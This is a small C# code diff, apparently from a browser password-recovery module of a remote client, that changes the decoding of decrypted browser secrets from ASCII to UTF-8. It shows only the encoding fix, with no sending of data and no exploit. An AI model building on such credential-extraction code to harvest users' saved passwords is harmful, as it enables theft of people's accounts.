@@ -67,7 +67,7 @@ namespace Comet.Client.Recovery.Browsers
                     {
                         byte[] bvRet = new byte[tSecDec.SECItemLen];
                         Marshal.Copy(tSecDec.SECItemData, bvRet, 0, tSecDec.SECItemLen);
-                        return Encoding.ASCII.GetString(bvRet);
+                        return Encoding.UTF8.GetString(bvRet);
                     }
                 }
             }
